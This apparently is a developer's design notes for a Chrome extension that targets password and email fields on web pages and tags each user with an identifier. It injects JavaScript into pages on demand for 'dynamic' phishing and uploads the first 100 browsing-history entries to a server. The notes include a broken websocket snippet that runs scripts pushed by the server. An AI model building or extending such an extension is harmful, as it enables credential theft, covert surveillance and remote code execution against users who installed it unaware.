Content Scripts - Run on the page when loaded up
Background Scripts - Literally background. Processes data in
the background and one of them are alive for the lifetime of the extension.

Consider searching by type = password or type = email.
Even google has type so may be possible
Some places have type as a text, like instagram which you can 
input a phone number on. Maybe stay away from those for now. 

Save unique identifier per user and upload it to storage as well. DONE

Figure out a way to grab unique identifier each time to upload to 
appropriate user.

Check storage and which person's system you are accessing.
Compare it to local storage and server token response.

Must be able to parse JSON file and run a script based off that file.

For dynamic you know what phishing is supposed to be
For the JS extension you have to be able to inject JS into the user is 
DOM whenever you want to. Maybe after user clicks/searches for a website?

ws.onmessage = function(event) {
  if (event.type()=="script"
     x=event.parse;
    run(x)
}

Bug with chrome.onRemoved, there is no way to check it when someone closes 
chrome because it will have no where to run the script on. 
For now I am going to check history upon activation of chrome. 
This will load the first 100 results and send it over to the sever. 
It is up to the server (Jai Wei) to determine if it is new information 
and to send it off to the database to be appended.  

When you sync.set in chrome storage, next time a new window is opened
will be when the value will be set.
